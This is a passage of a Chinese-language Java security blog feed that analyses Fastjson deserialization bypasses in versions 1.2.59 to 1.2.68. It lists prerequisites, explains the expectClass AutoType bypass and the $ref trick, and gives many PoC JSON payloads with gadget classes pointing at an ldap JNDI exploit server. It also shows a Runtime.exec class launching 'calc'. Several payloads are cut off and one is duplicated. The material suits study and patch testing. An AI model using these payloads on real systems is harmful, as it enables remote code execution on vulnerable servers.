&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&amp;#34;,&amp;#34;properties&amp;#34;: {&amp;#34;@type&amp;#34;:&amp;#34;java.util.Properties&amp;#34;,&amp;#34;UserTra
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;1267反序列化漏洞黑名单绕过&#34;&gt;1.2.67反序列化漏洞（黑名单绕过）
&lt;/h2&gt;&lt;h3 id=&#34;前提条件-2&#34;&gt;前提条件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;开启AutoType；&lt;/li&gt;
&lt;li&gt;Fastjson &amp;lt;= 1.2.67；&lt;/li&gt;
&lt;li&gt;JNDI注入利用所受的JDK版本限制；&lt;/li&gt;
&lt;li&gt;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；&lt;/li&gt;
&lt;li&gt;org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞原理-1&#34;&gt;漏洞原理
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;新Gadget绕过黑名单限制。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类PoC：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup&amp;#34;, &amp;#34;jndiNames&amp;#34;:[&amp;#34;ldap://localhost:1389/Exploit&amp;#34;], &amp;#34;tm&amp;#34;: {&amp;#34;$ref&amp;#34;:&amp;#34;$.tm&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.shiro.jndi.JndiObjectFactory类PoC：&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.shiro.jndi.JndiObjectFactory&amp;#34;,&amp;#34;resourceName&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;,&amp;#34;instance&amp;#34;:{&amp;#34;$ref&amp;#34;:&amp;#34;$.instance&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;poc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String poc = &amp;#34;{\&amp;#34;@type\&amp;#34;:\&amp;#34;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&amp;#34;,&amp;#34; +  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &amp;#34; \&amp;#34;jndiNames\&amp;#34;:[\&amp;#34;ldap://localhost:1234/ExportObject\&amp;#34;], \&amp;#34;tm\&amp;#34;: {\&amp;#34;$ref\&amp;#34;:\&amp;#34;$.tm\&amp;#34;}}&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;JSON.parse(poc);  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;1268反序列化漏洞expectclass绕过autotype&#34;&gt;1.2.68反序列化漏洞（expectClass绕过AutoType）
&lt;/h2&gt;&lt;h3 id=&#34;前提条件-3&#34;&gt;前提条件
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Fastjson &amp;lt;= 1.2.68；&lt;/li&gt;
&lt;li&gt;利用类必须是expectClass类的子类或实现类，并且不在黑名单中；&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;漏洞原理-2&#34;&gt;漏洞原理
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;本次绕过&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数的关键点在于其第二个参数expectClass，可以通过构造恶意JSON数据、传入某个类作为expectClass参数再传入另一个expectClass类的子类或实现类来实现绕过&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数执行恶意操作。&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;简单地说，本次绕过&lt;/font&gt;&lt;code&gt;checkAutoType()&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;函数的攻击步骤为：&lt;/font&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先传入某个类，其加载成功后将作为expectClass参数传入&lt;code&gt;checkAutoType()&lt;/code&gt;函数；&lt;/li&gt;
&lt;li&gt;查找expectClass类的子类或实现类，如果存在这样一个子类或实现类其构造方法或&lt;code&gt;setter&lt;/code&gt;方法中存在危险操作则可以被攻击利用;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;简单地验证利用expectClass绕过的可行性，先假设Fastjson服务端存在如下实现AutoCloseable接口类的恶意类VulAutoCloseable：&lt;/font&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public class VulAutoCloseable implements AutoCloseable {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public VulAutoCloseable(String cmd) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        try {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            Runtime.getRuntime().exec(cmd);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        } catch (Exception e) {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            e.printStackTrace();
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public void close() throws Exception {
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;poc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;java.lang.AutoCloseable&amp;#34;,&amp;#34;@type&amp;#34;:&amp;#34;org.example.VulAutoCloseable&amp;#34;,&amp;#34;cmd&amp;#34;:&amp;#34;calc&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;其他一些绕过黑名单的gadget&#34;&gt;其他一些绕过黑名单的Gadget
&lt;/h2&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;这里补充下其他一些Gadget，可自行尝试。注意，均需要开启AutoType，且会被JNDI注入利用所受的JDK版本限制。&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&#34;1259&#34;&gt;1.2.59
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;com.zaxxer.hikari.HikariConfig类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;metricRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}或{&amp;#34;@type&amp;#34;:&amp;#34;com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;healthCheckRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;1261&#34;&gt;1.2.61
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.commons.proxy.provider.remoting.SessionBeanProvider类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&amp;#34;,&amp;#34;jndiName&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;,&amp;#34;Object&amp;#34;:&amp;#34;a&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;1262&#34;&gt;1.2.62
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.cocoon.components.slide.impl.JMSContentInterceptor类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&amp;#34;,&amp;#34;jndiName&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;,&amp;#34;Object&amp;#34;:&amp;#34;a&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;1268&#34;&gt;1.2.68
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;metricRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}或{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&amp;#34;,&amp;#34;healthCheckRegistry&amp;#34;:&amp;#34;ldap://localhost:1389/Exploit&amp;#34;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;com.caucho.config.types.ResourceRef类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;com.caucho.config.types.ResourceRef&amp;#34;,&amp;#34;lookupName&amp;#34;: &amp;#34;ldap://localhost:1389/Exploit&amp;#34;, &amp;#34;value&amp;#34;: {&amp;#34;$ref&amp;#34;:&amp;#34;$.value&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;未知版本&#34;&gt;未知版本
&lt;/h3&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory&amp;#34;, &amp;#34;tmJndiName&amp;#34;: &amp;#34;ldap://localhost:1389/Exploit&amp;#34;, &amp;#34;tmFromJndi&amp;#34;: true, &amp;#34;transactionManager&amp;#34;: {&amp;#34;$ref&amp;#34;:&amp;#34;$.transactionManager&amp;#34;}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory类PoC：&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;JSON&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{&amp;#34;@type&amp;#34;:&amp;#34;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory&amp;#34;, &amp;#34;tmJndiNa
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;font-stylecolorrgb34-34-34利用ref实现fastjson的反序列化font&#34;&gt;&lt;font style=&#34;color:rgb(34, 34, 34);&#34;&gt;利用$ref实现fastjson的反序列化&lt;/font&gt;
&lt;/h1&gt;&lt;p&gt;这是利用了fastjson的jsonpath&lt;/p&gt;
&lt;p&gt;poc&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String payload = &amp;#34;[{\&amp;#34;@type\&amp;#34;:\&amp;#34;com.lxraa.serialize.fastjson.Test\&amp;#34;,\&amp;#34;id\&amp;#34;:123},{\&amp;#34;$ref\&amp;#34;:\&amp;#34;$[0].id\&amp;#34;}]&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{\&amp;#34;$ref\&amp;#34;:\&amp;#34;$[0].id\&amp;#34;} 反序列化时会调用Test类的getid方法
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;代码跟进到能看到invoke反射调用方法,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733488507554-cfababb4-93a0-400c-8df4-85771e93ed34.png&#34;
	width=&#34;512&#34;
	height=&#34;176&#34;
	srcset=&#34;https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733488507554-cfababb4-93a0-400c-8df4-85771e93ed34_hu73ef362384a85283da1c0858c3008b90_17626_480x0_resize_box_3.png 480w, https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson2/1733488507554-cfababb4-93a0-400c-8df4-85771e93ed34_hu73ef362384a85283da1c0858c3008b90_17626_1024x0_resize_box_3.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;290&#34;
		data-flex-basis=&#34;698px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;method&lt;/code&gt;类似于&lt;code&gt;Method method = getMethod(&amp;quot;getid&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;javaObject是&lt;code&gt;Test&lt;/code&gt;类&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Fastjson-1.2.24版本漏洞分析</title>
        <link>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/</link>
        <pubDate>Wed, 08 Jan 2025 14:49:43 +0800</pubDate>
        
        <guid>https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/</guid>
        <description>&lt;img src="https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson1/24.jpg" alt="Featured image of post Fastjson-1.2.24版本漏洞分析" /&gt;&lt;ul&gt;
&lt;li&gt;dk8u65，最好是低一点的版本，因为有一条 Jndi 的链子；虽然说也是可以绕过，我们这里还是一步步来比较好。&lt;/li&gt;
&lt;li&gt;Maven 3.6.3&lt;/li&gt;
&lt;li&gt;1.2.22 &amp;lt;= Fastjson &amp;lt;= 1.2.24&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;pom.xml 导入如下所示&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;XML&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
